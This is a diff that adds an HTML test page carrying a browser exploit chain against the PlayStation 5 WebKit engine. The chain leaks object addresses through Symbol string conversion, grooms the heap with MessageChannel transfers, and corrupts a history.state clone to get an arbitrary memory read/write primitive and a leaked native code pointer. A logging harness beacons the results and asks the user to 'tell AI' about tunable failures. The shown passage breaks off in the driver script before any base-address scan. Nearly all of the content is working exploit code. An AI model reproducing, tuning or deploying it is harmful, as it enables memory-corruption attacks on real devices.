@@ -1,0 +1,910 @@
+<!--
+  P1300: pesto Symbol/history-clone ARW primitive — LIVE TEST on 14.10
+  + inline ELF-scan from the leaked native-constructor to derive the webkit base.
+
+  If establishPrimitive() resolves on 14.10, we have a CLEAN arbitrary R/W
+  (redirectable Uint8Array) + a .text code pointer (__ps5NativeCtor). The scan
+  then walks DOWN in 16KB pages to the \x7fELF header (ET_DYN + PT_LOAD contains
+  ctor) = webkit base. base = ctor - RVA  ->  Step 5 solved, offsetless.
+
+  webkit.js core is pasted VERBATIM from pastawithpesto/src/webkit.js (only the
+  `export` keyword removed). Harness + dark-mode banner + ELF-scan appended.
+
+  CRASH_CLASS: MODERATE (heavy heap groom per attempt; may crash-loop if patched)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>P1301 pesto ARW diag</title>
+<style>
+  html,body{background:#0d0f12;color:#d7dde3;margin:0;font:14px/1.5 ui-monospace,Menlo,Consolas,monospace}
+  #bn{position:fixed;top:0;left:0;right:0;z-index:99999;font:700 18px/1.3 ui-monospace,monospace;padding:16px 14px;text-align:center;color:#fff;border-bottom:3px solid #333;background:#222;min-height:22px}
+  #sub{position:fixed;top:72px;left:0;right:0;z-index:99998;font:600 12px ui-monospace,monospace;padding:6px 12px;text-align:center;color:#9aa4ad;background:#15181c;border-bottom:1px solid #262b31}
+  #out{margin:104px 0 0 0;padding:12px;white-space:pre-wrap;word-break:break-all;color:#aeb6bd;font-size:12px}
+  .k{color:#6fd08c}.a{color:#e0b24a}.r{color:#e06a5a}
+</style></head>
+<body>
+<div id="ev" style="position:fixed;top:104px;right:0;width:44%;max-height:66vh;overflow:auto;z-index:99997;background:#0f1317;border-left:2px solid #2a3139;padding:8px 10px;font:12px/1.45 ui-monospace,monospace;color:#cfd6dd"><div style="color:#7f8a93;font-weight:700;margin-bottom:5px">EVENTS SEEN (persists across refreshes)</div><div id="evlist"></div></div>
+<div id="bn">starting…</div>
+<div id="sub">pesto Symbol + history.state ARW — testing on this console</div>
+<pre id="out">P1301 boot
+</pre>
+
+<script>
+/* ---------- harness: dark banner + beacons ---------- */
+var OUT=document.getElementById('out');
+var UID=Math.random().toString(36).slice(2,8).toUpperCase();
+var T0=Date.now();
+function L(m){try{OUT.textContent+='\n['+((Date.now()-T0)/1000).toFixed(1)+'s] '+m;}catch(e){}}
+function BK(m){ L(m);
+  try{var x=new XMLHttpRequest();x.open('GET','/beacon/P1301-'+encodeURIComponent(m)+'?t='+Date.now()+'&u='+UID,false);x.send(null);}catch(e){}
+}
+window.__st={msg:'starting pesto ARW primitive…',bg:'#222'};
+function S(msg,bg){window.__st={msg:msg,bg:bg||'#222'};}
+var BN=document.getElementById('bn');
+setInterval(function(){var s=window.__st||{};BN.textContent=s.msg;BN.style.background=s.bg;try{renderEv();}catch(e){}},300);
+var EVMAP={};
+try{ EVMAP=JSON.parse(localStorage.getItem('p1301_ev')||'{}')||{}; }catch(e){ EVMAP={}; }
+if(/[?&]reset=1/.test(location.search)){ EVMAP={}; try{localStorage.removeItem('p1301_ev');}catch(e){} }
+var EVRANK={hit:0,tune:1,warn:2,mut:3}, EVLIST=document.getElementById('evlist');
+function clsOf(reason){ var r=String(reason).toLowerCase();
+  if(r.indexOf('copy length')>=0||r.indexOf('clone length')>=0||r.indexOf('view header')>=0||r.indexOf('view flags')>=0||r.indexOf('corrupted view')>=0) return 'tune';
+  if(r.indexOf('not corrupted')>=0||r.indexOf('address leak')>=0||r.indexOf('leaked addresses')>=0||r.indexOf('fake object')>=0||r.indexOf('pointer check')>=0||r.indexOf('holder')>=0||r.indexOf('layout')>=0||r.indexOf('header update')>=0) return 'warn';
+  return 'mut'; }
+function renderEv(){ if(!EVLIST)return; var ks=Object.keys(EVMAP);
+  ks.sort(function(a,b){var ra=EVRANK[EVMAP[a].cls]==null?3:EVRANK[EVMAP[a].cls],rb=EVRANK[EVMAP[b].cls]==null?3:EVRANK[EVMAP[b].cls];if(ra!==rb)return ra-rb;return (EVMAP[b].last||0)-(EVMAP[a].last||0);});
+  var col={hit:'#6fd08c',tune:'#49c7e0',warn:'#e0b24a',mut:'#8a939b'}, h='';
+  for(var i=0;i<ks.length;i++){var e=EVMAP[ks[i]],c=col[e.cls]||'#8a939b',wt=(e.cls==='hit')?'700':'400';
+    h+='<div style="margin:3px 0;color:'+c+';font-weight:'+wt+'">'+(e.cls==='hit'?'★ ':'')+String(e.text).replace(/[<>&]/g,'')+'  <span style="color:#5f6a72">×'+e.n+'</span></div>';}
+  EVLIST.innerHTML=h; }
+function EV(key,text,cls,explicitN){ var e=EVMAP[key]||{n:0,cls:cls,first:Date.now()};
+  e.text=text; e.cls=cls; e.n=(explicitN!=null)?explicitN:(e.n+1); e.last=Date.now(); EVMAP[key]=e;
+  try{localStorage.setItem('p1301_ev',JSON.stringify(EVMAP));}catch(e2){} renderEv(); }
+renderEv();
+window.__Dseen={};
+window.__D=function(tag,val){ try{ var k='D:'+tag+':'+val; if(window.__Dseen[k])return; window.__Dseen[k]=1; var sv=String(val).replace(/[^A-Za-z0-9._-]/g,'_').slice(0,60); new Image().src='/beacon/P1301-D-'+tag+'-'+sv+'?t='+Date.now(); try{EVMAP['D:'+tag]={n:((EVMAP['D:'+tag]&&EVMAP['D:'+tag].n)||0)+1,text:tag+'='+val,cls:'tune',last:Date.now()};localStorage.setItem('p1301_ev',JSON.stringify(EVMAP));}catch(e2){} }catch(e){} };
+BK('BOOT-'+UID);
+</script>
+
+<script>
+/* ======================================================================
+   pastawithpesto/src/webkit.js  — VERBATIM (only `export` removed @ 710)
+   ====================================================================== */
+const DUPLICATE_INDEX = 2;
+const CONTROL_INDEX = 0xffff;
+const LEAK_STRING_LENGTH = 924176;
+const CELL_BYTES = 0x30;
+const NATIVE_EXECUTABLE_BYTES = 0x38;
+const HOLDER_BYTES = 0x40;
+const MEMORY_WINDOW_SIZE = 0x100;
+const CANARY_OFFSET = 0x20;
+const LEAK_SLOT_OFFSET = 0x20;
+
+const symbolToString = Symbol.prototype.toString;
+const viewHeader = new Uint8Array(CELL_BYTES);
+const targetHeader = new Uint8Array(NATIVE_EXECUTABLE_BYTES);
+const holderHeader = new Uint8Array(HOLDER_BYTES);
+const scratchBits = new ArrayBuffer(8);
+const scratchBytes = new Uint8Array(scratchBits);
+const scratchWords = new Uint32Array(scratchBits);
+const scratchDouble = new Float64Array(scratchBits);
+const identityMagic = new Uint8Array([0x5a, 0xa5, 0xc3, 0x3c, 0xde, 0xad, 0xbe, 0xef,]);
+const identityBytes = new Uint8Array(8);
+const nativeTarget = parseInt;
+
+let attemptNumber = 0
+let keepIndex = 0
+let keepAlive = null
+let onEvent = null
+let settleResolve = null
+let memoryView = null
+let memoryMirror = null
+let targetView = null
+let fakeHost = null
+let markerObjectA = null
+let targetHolder = null
+let outerGraph = null
+let leakedScope = null
+let getterCarrier = null
+let preparedSymbolObject = null
+let capturedString = null
+let capturedWords = null
+let copiedLength = 0
+let captureError = null
+let predecessorWords = null
+let liveCandidate = null
+
+function hex(value) {
+  return `0x${value.toString(16).padStart(16, "0")}`;
+}
+
+function buffer(size) {
+  return new ArrayBuffer(size);
+}
+
+function allZero(bytes, start, end) {
+  for (let i = start; i < end; ++i) {
+    if (bytes[i] !== 0) return false;
+  }
+  return true;
+}
+
+function usesLegacyWebKit() {
+  return /PlayStation 5\/[0-8]\./.test(navigator.userAgent);
+}
+
+function fillerBigIntCount() {
+  if (!usesLegacyWebKit()) return 1;
+  return [2, 4, 6, 7][(attemptNumber - 1) % 4];
+}
+
+function uint32At(bytes, offset) {
+  const low16 = bytes[offset] + bytes[offset + 1] * 0x100;
+  const high16 = bytes[offset + 2] + bytes[offset + 3] * 0x100;
+  return low16 + high16 * 0x10000;
+}
+
+function low48At(bytes, offset) {
+  const low32 = uint32At(bytes, offset);
+  const high16 = bytes[offset + 4] + bytes[offset + 5] * 0x100;
+  return low32 + high16 * 0x100000000;
+}
+
+function readBytes(destination, source, count) {
+  for (let i = 0; i < count; ++i) destination[i] = source[i];
+}
+
+function sameBytes(left, right, count) {
+  for (let i = 0; i < count; ++i) {
+    if (left[i] !== right[i]) return false;
+  }
+  return true;
+}
+
+function redirectView(candidate, address) {
+  const high = Math.floor(address / 0x100000000);
+  scratchWords[0] = address - high * 0x100000000;
+  scratchWords[1] = high;
+  for (let i = 0; i < 8; ++i) candidate[0x10 + i] = scratchBytes[i];
+}
+
+function restoreView(candidate) {
+  for (let i = 0; i < 8; ++i) candidate[0x10 + i] = viewHeader[0x10 + i];
+}
+
+function pointerFromWords(words, offset) {
+  if (words[offset + 3] !== 0) return NaN;
+  const low32 = words[offset] + words[offset + 1] * 0x10000;
+  return low32 + words[offset + 2] * 0x100000000;
+}
+
+function plausibleCell(value) {
+  return plausibleAddress(value) && value % 8 === 0;
+}
+
+function plausibleAddress(value) {
+  return Number.isSafeInteger(value) &&
+    value > 2 ** 32 &&
+    value < 2 ** 48;
+}
+
+function canonicalLow48(bytes, offset) {
+  return bytes[offset + 6] === 0 && bytes[offset + 7] === 0;
+}
+
+function encodedHeaderNumber() {
+  const raw = new ArrayBuffer(8);
+  const words = new Uint32Array(raw);
+  const number = new Float64Array(raw);
+  words[0] = 0x00004250;
+  words[1] = 0x01062800;
+  return number[0];
+}
+
+function emit(tag, detail, type) {
+  if (onEvent !== null)
+    onEvent(tag, detail === undefined ? "" : String(detail), type);
+}
+
+function isOurCorruptedView(candidate, originalVector) {
+  if (!plausibleCell(originalVector)) return false;
+  redirectView(candidate, originalVector + CANARY_OFFSET);
+  readBytes(identityBytes, memoryView, 8);
+  restoreView(candidate);
+  return sameBytes(identityBytes, identityMagic, 8) && memoryView[0] === 0x3c;
+}
+
+function dropAttemptReferences() {
+  memoryView = null;
+  memoryMirror = null;
+  targetView = null;
+  fakeHost = null;
+  markerObjectA = null;
+  targetHolder = null;
+  outerGraph = null;
+  leakedScope = null;
+  getterCarrier = null;
+  preparedSymbolObject = null;
+  capturedString = null;
+  capturedWords = null;
+  predecessorWords = null;
+}
+
+function releaseAttempt() {
+  dropAttemptReferences();
+  keepAlive = null;
+  try {
+    history.replaceState(null, "");
+  } catch {}
+}
+
+function retry(reason, safeToRelease) {
+  const nextAttempt = attemptNumber + 1;
+  emit("Retry", `${reason} attempt ${nextAttempt}`);
+  if (safeToRelease) releaseAttempt();
+  setTimeout(() => {
+    attemptNumber = nextAttempt;
+    startAttempt();
+  }, safeToRelease ? 750 : 50);
+}
+
+function finishEarlySafeAttempt(reason, detail = "") {
+  retry(detail ? `${reason}: ${detail}` : reason, true);
+}
+
+function resetAttemptState() {
+  dropAttemptReferences();
+  copiedLength = 0;
+  captureError = null;
+  keepIndex = 0;
+  keepAlive = [];
+  liveCandidate = null;
+}
+
+function startAttempt() {
+  resetAttemptState();
+  emit("Attempt", String(attemptNumber));
+  try {
+    storeHistoryGraph();
+    for (let i = 0; i < 8; ++i)
+      memoryView[CANARY_OFFSET + i] = identityMagic[i];
+    prepareAddressLeak();
+  } catch (error) {
+    finishEarlySafeAttempt(
+      "setup failed",
+      `${error?.name}: ${String(error?.message).slice(0, 80)}`,
+    );
+  }
+}
+
+// Address-leak helper
+function leakScopeObject() {
+  class Leaker {
+    leak() {
+      return super.foo;
+    }
+  }
+  Leaker.prototype.__proto__ = new Proxy({}, {
+    get: function (target, property, receiver) {
+      return receiver;
+    },
+  });
+  const leak = Leaker.prototype.leak;
+  return (function () {
+    return leak();
+  })();
+}
+
+function prepareSymbolWrapper(getter) {
+  leakedScope = leakScopeObject();
+  if (leakedScope === undefined || leakedScope === null)
+    throw new Error("Scope not leaked.");
+
+  for (let i = 0; i < 512; i++) leakedScope[`p${i}`] = i;
+  for (let j = 0; j < 8; j++) leakedScope[j] = 1.1 * j;
+
+  Object.defineProperty(leakedScope, "g", {
+    get: getter,
+    configurable: true,
+  });
+  return Object(leakedScope.g);
+}
+
+// Stage 1: build the objects later reached through the corrupted clone.
+function prepareExploitObjects() {
+  const memoryBuffer = new ArrayBuffer(MEMORY_WINDOW_SIZE);
+  memoryView = new Uint8Array(memoryBuffer);
+  memoryMirror = new Uint8Array(memoryBuffer);
+  memoryMirror[0] = 0x3c;
+
+  const guardBuffer = new ArrayBuffer(0x20);
+  targetView = new Uint8Array(guardBuffer);
+  targetView[0] = 0xa5;
+  const lengthMarker = { keep: 0x51515151 };
+
+  fakeHost = {
+    q0: encodedHeaderNumber(),
+    q1: 1.1,
+    q2: memoryView,
+    q3: lengthMarker,
+    q4: 2.2,
+    q5: 3.3,
+  };
+
+  delete fakeHost.q1;
+  delete fakeHost.q4;
+  delete fakeHost.q5;
+
+  const domAnchor = document.createElement("textarea");
+  markerObjectA = { marker: 0x4d41524b };
+  const markerObjectB = { marker: 0x4d41524c };
+  const holderGuardA = { marker: 0x484f4c44 };
+  const holderGuardB = { marker: 0x47554152 };
+  targetHolder = {
+    q0: nativeTarget,
+    q1: domAnchor,
+    q2: markerObjectA,
+    q3: markerObjectB,
+    q4: holderGuardA,
+    q5: holderGuardB,
+  };
+}
+
+function storeHistoryGraph() {
+  const referenceTarget = { marker: 0x51515151 };
+  prepareExploitObjects();
+
+  const fillerGraph = new Array(0xfffd);
+  let pos = 0;
+  const huge = 1n << 40n;
+  for (let i = 0; i < fillerBigIntCount(); i++)
+    fillerGraph[pos++] = huge + BigInt(i);
+  while (pos < fillerGraph.length) fillerGraph[pos++] = {};
+
+  outerGraph = new Array(CONTROL_INDEX + 1);
+  outerGraph[0] = fillerGraph;
+  outerGraph[1] = referenceTarget;
+  outerGraph[2] = referenceTarget;
+  outerGraph[CONTROL_INDEX] = -64000;
+
+  history.replaceState(outerGraph, "");
+}
+
+// Stage 2: leak fakeHost and targetHolder through the oversized Symbol string.
+function prepareAddressLeak() {
+  capturedWords = new Uint16Array(16);
+  getterCarrier = function getterCarrierFunction() {
+    return 7;
+  };
+
+  getterCarrier[0] = fakeHost;
+  for (let i = 1; i < 9000000; i++) getterCarrier[i] = 0;
+  getterCarrier[1] = targetHolder;
+  getterCarrier[2] = fakeHost;
+  getterCarrier[3] = targetHolder;
+  preparedSymbolObject = prepareSymbolWrapper(getterCarrier);
+
+  setTimeout(captureAddresses, 50);
+  setTimeout(finishAddressLeak, 100);
+}
+
+function captureAddresses() {
+  try {
+    capturedString = symbolToString.call(preparedSymbolObject);
+    copiedLength = capturedString.length;
+    try{if(window.__D)window.__D('LEN',copiedLength);}catch(e){}
+    if ((copiedLength & 0xffffff) !== (LEAK_STRING_LENGTH & 0xffffff)) {
+      capturedString = null;
+      return;
+    }
+    for (let i = 0; i < 16; i++)
+      capturedWords[i] = capturedString.charCodeAt(7 + i);
+  } catch (error) {
+    captureError = error;
+  }
+}
+
+// Stage 3 helper: fill the reclaimed predecessor allocation with fakeHost.
+function fillPointerSpray(backing, pointer) {
+  if (!plausibleCell(pointer))
+    throw new Error("Invalid fake address");
+
+  const high = Math.floor(pointer / 0x100000000);
+  const low = pointer - high * 0x100000000;
+
+  predecessorWords = new Uint32Array(backing);
+  for (let i = 0; i < predecessorWords.length; i += 2) {
+    predecessorWords[i] = low;
+    predecessorWords[i + 1] = high;
+  }
+
+  const last = predecessorWords.length - 2;
+  if (
+    predecessorWords[0] !== low ||
+    predecessorWords[1] !== high ||
+    predecessorWords[last] !== low ||
+    predecessorWords[last + 1] !== high
+  )
+    throw new Error("Pointer Fill verification failed");
+}
+
+function clearPointerSpray() {
+  if (predecessorWords !== null) predecessorWords.fill(0);
+}
+
+function invalidClone(reason, safe) {
+  clearPointerSpray();
+  return { status: "invalid", safe, reason };
+}
+
+function validStructure(header) {
+  const id = uint32At(header, 0);
+  return id >= 0x100 && id < 0x08000000;
+}
+
+function validViewLayout() {
+  if (!usesLegacyWebKit()) return allZero(viewHeader, 0x20, 0x28);
+  return allZero(viewHeader, 0x1c, 0x20) &&
+    viewHeader[0x20] <= 3 &&
+    allZero(viewHeader, 0x21, 0x28);
+}
+
+function inspectViewHeader() {
+  const vector = low48At(viewHeader, 0x10);
+
+  if (
+    !validStructure(viewHeader) ||
+    !plausibleAddress(low48At(viewHeader, 0x08)) ||
+    !plausibleAddress(vector) ||
+    uint32At(viewHeader, 0x18) !== MEMORY_WINDOW_SIZE ||
+    !validViewLayout()
+  )
+    return null;
+
+  return vector;
+}
+
+function makeUpgradedHeader() {
+  for (let i = 0; i < 8; i++) scratchBytes[i] = viewHeader[i];
+  const flags = scratchBytes[6] + scratchBytes[7] * 0x100 - 2;
+  scratchBytes[6] = flags & 0xff;
+  scratchBytes[7] = (flags >> 8) & 0xff;
+
+  const value = scratchDouble[0];
+  return Number.isFinite(value) ? value : null;
+}
+
+function inspectHolder(candidate, holderAddress) {
+  redirectView(candidate, holderAddress);
+  readBytes(holderHeader, memoryView, HOLDER_BYTES);
+  if (!sameBytes(holderHeader, memoryView, HOLDER_BYTES)) return null;
+
+  let functionAddress = null;
+  for (let offset = 0x10; offset <= 0x38; offset += 8) {
+    const address = low48At(holderHeader, offset);
+    if (!canonicalLow48(holderHeader, offset) || !plausibleCell(address))
+      return null;
+    if (offset === 0x10) functionAddress = address;
+  }
+
+  return functionAddress;
+}
+
+function inspectFunction(candidate, address) {
+  redirectView(candidate, address);
+  readBytes(targetHeader, memoryView, 0x20);
+
+  const executable = low48At(targetHeader, 0x18);
+
+  if (
+    !validStructure(targetHeader) ||
+    !plausibleAddress(low48At(targetHeader, 0x08)) ||
+    !plausibleAddress(low48At(targetHeader, 0x10)) ||
+    !plausibleCell(executable)
+  )
+    return null;
+
+  return { executable, type: targetHeader[5] };
+}
+
+function inspectNativeExecutable(candidate, address) {
+  redirectView(candidate, address);
+  readBytes(targetHeader, memoryView, NATIVE_EXECUTABLE_BYTES);
+
+  const nativeFunction = low48At(targetHeader, 0x28);
+  const nativeConstructor = low48At(targetHeader, 0x30);
+  if (
+    !validStructure(targetHeader) ||
+    !canonicalLow48(targetHeader, 0x28) ||
+    !canonicalLow48(targetHeader, 0x30) ||
+    !plausibleAddress(nativeFunction) ||
+    !plausibleAddress(nativeConstructor) ||
+    nativeFunction === nativeConstructor
+  )
+    return null;
+
+  return {
+    nativeFunction,
+    nativeConstructor,
+    type: targetHeader[5],
+  };
+}
+
+function rejectRedirected(candidate, reason) {
+  restoreView(candidate);
+  return invalidClone(reason, false);
+}
+
+// Stage 4: history.state should now return a corrupted Uint8Array.
+function inspectClonedGraph(holderAddress) {
+  let clone = null;
+  let candidate = null;
+  let headerRead = false;
+  let vectorRedirected = false;
+
+  try {
+    clone = history.state;
+    try{if(window.__D){window.__D('CLONELEN',(clone&&clone.length));window.__D('CLONESAME',!!(clone&&clone[1]===clone[DUPLICATE_INDEX]));}}catch(e){}
+    if (clone.length !== 0x50001) {
+      clone[DUPLICATE_INDEX] = undefined;
+      return invalidClone("Unexpected clone length", true);
+    }
+
+    if (clone[1] === clone[DUPLICATE_INDEX]) {
+      clone[DUPLICATE_INDEX] = undefined;
+      clearPointerSpray();
+      return { status: "unchanged", safe: true };
+    }
+
+    candidate = clone[DUPLICATE_INDEX];
+    clone[DUPLICATE_INDEX] = undefined;
+    clone = null;
+
+    readBytes(viewHeader, candidate, CELL_BYTES);
+    headerRead = true;
+
+    const originalVector = inspectViewHeader();
+    if (originalVector === null) {
+      const safe = allZero(viewHeader, 0, CELL_BYTES);
+      try{if(window.__D){var _vh='';for(var _vi=0;_vi<0x30;_vi++){_vh+=('0'+viewHeader[_vi].toString(16)).slice(-2);}window.__D('VHDR',_vh);}}catch(e){}
+      return invalidClone("Invalid view header", safe);
+    }
+
+    vectorRedirected = true;
+    const identityProved = isOurCorruptedView(candidate, originalVector);
+    vectorRedirected = false;
+    if (!identityProved) return invalidClone("Wrong corrupted view", false);
+
+    const newHeader = makeUpgradedHeader();
+    if (newHeader === null) return invalidClone("Invalid view flags", false);
+
+    fakeHost.q0 = newHeader;
+    if (fakeHost.q0 !== newHeader) return invalidClone("Header update failed", false);
+
+    vectorRedirected = true;
+    const nativeTargetAddress = inspectHolder(candidate, holderAddress);
+    if (nativeTargetAddress === null)
+      return rejectRedirected(candidate, "Invalid holder layout");
+
+    const functionInfo = inspectFunction(candidate, nativeTargetAddress);
+    if (functionInfo === null)
+      return rejectRedirected(candidate, "Invalid function layout");
+
+    const nativeInfo = inspectNativeExecutable(candidate, functionInfo.executable);
+    if (nativeInfo === null)
+      return rejectRedirected(candidate, "Invalid executable layout");
+
+    globalThis.__ps5NativeCtor = nativeInfo.nativeConstructor;
+
+    redirectView(candidate, nativeTargetAddress);
+    const functionMatches =
+      low48At(memoryView, 0x18) === functionInfo.executable &&
+      memoryView[5] === functionInfo.type;
+
+    redirectView(candidate, functionInfo.executable);
+    const nativeMatches =
+      low48At(memoryView, 0x28) === nativeInfo.nativeFunction &&
+      low48At(memoryView, 0x30) === nativeInfo.nativeConstructor &&
+      memoryView[5] === nativeInfo.type;
+
+    restoreView(candidate);
+    vectorRedirected = false;
+    if (
+      !functionMatches ||
+      !nativeMatches ||
+      memoryView[0] !== 0x3c ||
+      memoryMirror[0] !== 0x3c ||
+      targetView[0] !== 0xa5
+    ) {
+      return invalidClone("Pointer check failed", false);
+    }
+
+    liveCandidate = candidate;
+    clearPointerSpray();
+    return {
+      status: "ready",
+      originalVector,
+      functionAddress: nativeTargetAddress,
+      executableAddress: functionInfo.executable,
+      nativeInfo,
+    };
+  } catch (error) {
+    const safe =
+      candidate === null &&
+      clone === null &&
+      !headerRead &&
+      error?.name === "TypeError";
+    if (clone !== null) {
+      try {
+        clone[DUPLICATE_INDEX] = undefined;
+      } catch {}
+    }
+    if (candidate !== null && headerRead && vectorRedirected) {
+      try {
+        restoreView(candidate);
+      } catch {}
+    }
+    try {
+      targetView[0] = 0xa5;
+      memoryMirror[0] = 0x3c;
+    } catch {}
+    try {
+      clearPointerSpray();
+    } catch {}
+    return { status: "error", safe, error };
+  }
+}
+
+// Stage 3: create the required holes, spray fakeHost.
+function groomHeap(fakeAddress, holderAddress) {
+  let outcome;
+  try {
+    const channel = new MessageChannel();
+    channel.port1.close();
+    channel.port2.close();
+
+    for (let i = 0; i < 512; i++)
+      keepAlive[keepIndex++] = buffer(0x10000);
+
+    let slab = buffer(0x400000);
+    channel.port1.postMessage(0, [slab]);
+    slab = null;
+
+    const butterflyHole1 = buffer(0x81000);
+    const butterflyHole2 = buffer(0x81000);
+    const separator = buffer(0x10000);
+    const earlyHole = buffer(0x70000);
+    const guard = buffer(0x90000);
+    const predecessor = buffer(0x80000);
+    const finalHole = buffer(0x80000);
+
+    fillPointerSpray(predecessor, fakeAddress);
+    keepAlive[keepIndex++] = separator;
+    keepAlive[keepIndex++] = guard;
+    keepAlive[keepIndex++] = predecessor;
+
+    channel.port1.postMessage(0, [butterflyHole1, butterflyHole2, earlyHole, finalHole]);
+    outcome = inspectClonedGraph(holderAddress);
+  } catch (error) {
+    try {
+      clearPointerSpray();
+    } catch {}
+    outcome = { status: "error", safe: true, error };
+  }
+  finishAttempt(outcome, holderAddress, fakeAddress);
+}
+
+function finishAddressLeak() {
+  if (captureError !== null)
+    return finishEarlySafeAttempt("Address leak failed", `${captureError?.name}: ${String(captureError?.message).slice(0, 80)}`);
+  if (copiedLength === 0)
+    return finishEarlySafeAttempt("Address leak did not finish");
+  if ((copiedLength & 0xffffff) !== (LEAK_STRING_LENGTH & 0xffffff))
+    return finishEarlySafeAttempt("Unexpected copy length", `got ${copiedLength}, expected ${LEAK_STRING_LENGTH}`);
+
+  const hostAddress = pointerFromWords(capturedWords, 0);
+  const holderAddress = pointerFromWords(capturedWords, 4);
+  if (
+    hostAddress !== pointerFromWords(capturedWords, 8) ||
+    holderAddress !== pointerFromWords(capturedWords, 12) ||
+    hostAddress === holderAddress ||
+    !plausibleCell(hostAddress) ||
+    !plausibleCell(holderAddress)
+  ) return finishEarlySafeAttempt("Invalid leaked addresses");
+
+  const fakeAddress = hostAddress + 0x10;
+  if (!plausibleCell(fakeAddress))
+    return finishEarlySafeAttempt("Invalid fake object address", hex(hostAddress));
+  groomHeap(fakeAddress, holderAddress);
+}
+
+// Stage 5: retry placement misses or publish the validated memory window.
+function finishAttempt(outcome, holderAddress, fakeAddress) {
+  if (outcome.status === "error") {
+    emit("Failed", String(outcome.error?.message || outcome.error));
+    return retry("Heap placement failed", outcome.safe);
+  }
+
+  if (outcome.status === "unchanged")
+    return retry("Clone was not corrupted", true);
+
+  if (outcome.status === "invalid")
+    return retry(outcome.reason, outcome.safe);
+
+  if (outcome.status !== "ready" || liveCandidate === null) {
+    emit("Failed", "Memory window validation failed");
+    liveCandidate = null;
+    return retry("Memory window validation failed", false);
+  }
+
+  try {
+    history.replaceState(null, "");
+  } catch {}
+
+  const resolve = settleResolve;
+  settleResolve = null;
+  if (resolve !== null) resolve(createMemoryWindow(holderAddress));
+
+  emit("leak_addr", hex(holderAddress + LEAK_SLOT_OFFSET), "info");
+  emit("host_addr", hex(fakeAddress - 0x10), "info");
+  emit("holder_addr", hex(holderAddress), "info");
+  emit("fake_addr", hex(fakeAddress), "info");
+  emit("view_vector", hex(outcome.originalVector), "info");
+  emit("function_addr", hex(outcome.functionAddress), "info");
+  emit("executable_addr", hex(outcome.executableAddress), "info");
+  emit("native_function", hex(outcome.nativeInfo.nativeFunction), "info");
+  emit("native_constructor", hex(outcome.nativeInfo.nativeConstructor), "info");
+}
+
+function createMemoryWindow(holderAddress) {
+  return {
+    setAddress(address) {
+      if (liveCandidate === null)
+        throw new Error("Memory window is no longer live");
+      if (!plausibleAddress(address))
+        throw new RangeError(`Invalid address ${address}`);
+      redirectView(liveCandidate, address);
+    },
+    resetAddress() {
+      if (liveCandidate === null)
+        throw new Error("Memory window is no longer live");
+      restoreView(liveCandidate);
+    },
+    bytes: memoryView,
+    size: MEMORY_WINDOW_SIZE,
+    leakAddress: holderAddress + LEAK_SLOT_OFFSET,
+    setLeakObject(value) {
+      targetHolder.q2 = value;
+    },
+    clearLeakObject() {
+      targetHolder.q2 = markerObjectA;
+    },
+  };
+}
+
+function establishPrimitive(eventHandler = null) {
+  if (settleResolve !== null)
+    return Promise.reject(new Error("Already Running..."));
+  if (
+    typeof BigInt !== "function" ||
+    typeof MessageChannel !== "function" ||
+    typeof Symbol !== "function" ||
+    typeof history === "undefined" ||
+    typeof history.replaceState !== "function"
+  )
+    return Promise.reject(new Error("Unsupported Browser"));
+
+  onEvent = typeof eventHandler === "function" ? eventHandler : null;
+
+  attemptNumber = 1;
+
+  return new Promise((resolve) => {
+    settleResolve = resolve;
+    startAttempt();
+  });
+}
+</script>
+
+<script>
+/* ======================================================================
+   P1300 driver: run the primitive, then ELF-scan to the webkit base.
+   ====================================================================== */
+(function(){
+  var attempts=0, lastReason='', seenReason={};
+  try{ BK('UA-'+String(navigator.userAgent).replace(/[^A-Za-z0-9.]/g,'_').slice(0,90)); }catch(e){}
+  try{ BK('LEGACYPATH-'+(/PlayStation 5\/[0-8]\./.test(navigator.userAgent))); }catch(e){}
+  function stripAtt(s){ return String(s).replace(/ attempt \d+$/,''); }
+  function diag(reason){
+    var r=reason.toLowerCase();
+    if(r.indexOf('copy length')>=0) return ['🔎 LEAK length mismatch: '+reason+'  (TUNABLE! tell AI)','#0a4a5a'];
+    if(r.indexOf('unexpected clone length')>=0) return ['🔎 clone corrupts, wrong length: '+reason+'  (TUNABLE! tell AI)','#0a4a5a'];
+    if(r.indexOf('view header')>=0||r.indexOf('view flags')>=0||r.indexOf('corrupted view')>=0) return ['🔎 clone corrupts, view layout differs: '+reason+'  (TUNABLE)','#0a4a5a'];
+    if(r.indexOf('clone was not corrupted')>=0) return ['🔎 clone NOT corrupting (att '+attempts+') - groom miss or PATCH','#5a3a00'];
+    if(r.indexOf('address leak')>=0) return ['🔎 Symbol leak not finishing: '+reason,'#5a3a00'];
+    if(r.indexOf('leaked addresses')>=0||r.indexOf('fake object')>=0) return ['🔎 leak ran, pointer shape off: '+reason,'#5a3a00'];
+    if(r.indexOf('pointer check')>=0||r.indexOf('holder')>=0||r.indexOf('function layout')>=0||r.indexOf('executable layout')>=0||r.indexOf('header update')>=0) return ['🔎 deep layout mismatch: '+reason,'#5a3a00'];
+    return ['🔄 working... att '+attempts+' ('+reason+')','#2a2f36'];
+  }
+  function evHandler(tag, detail, type){
+    if(tag==='Attempt'){
+      attempts=parseInt(detail,10)||attempts;
+      if(attempts<=3||attempts%10===0) BK('ATT-'+attempts);
+      EV('att','working (reached attempt '+attempts+')','mut');
+      S('🔄 working… attempt '+attempts+'  (refresh / reboot browser helps)','#2a2f36');
+      return;
+    }
+    if(tag==='Retry'){
+      var reason=stripAtt(detail); lastReason=reason; L('  retry: '+reason);
+      if(!seenReason[reason]){ seenReason[reason]=1; BK('RETRY-'+reason.replace(/[^A-Za-z0-9._-]/g,'_').slice(0,110)); }
+      EV('R:'+reason, reason, clsOf(reason));
+      var dd=diag(reason); S(dd[0],dd[1]);
+      return;
+    }
+    if(tag==='Failed'){
+      var fr=stripAtt(detail); L('  failed: '+fr);
+      if(!seenReason['F:'+fr]){ seenReason['F:'+fr]=1; BK('FAILEDR-'+fr.replace(/[^A-Za-z0-9._-]/g,'_').slice(0,110)); }
+      EV('F:'+fr, 'FAILED: '+fr, 'warn');
+      return;
+    }
+    if(type==='info'){ BK(tag.toUpperCase()+'-'+detail); EV('I:'+tag, tag+'='+detail, 'hit'); if(tag==='native_constructor'){S('📟 CODE POINTER leaked '+detail+' — scanning for base…','#0a4a7a');} return; }
+  }
+
+  // watchdog: if it hasn't resolved in 30s, hint that it may be patched / needs refreshes
+  var resolved=false;
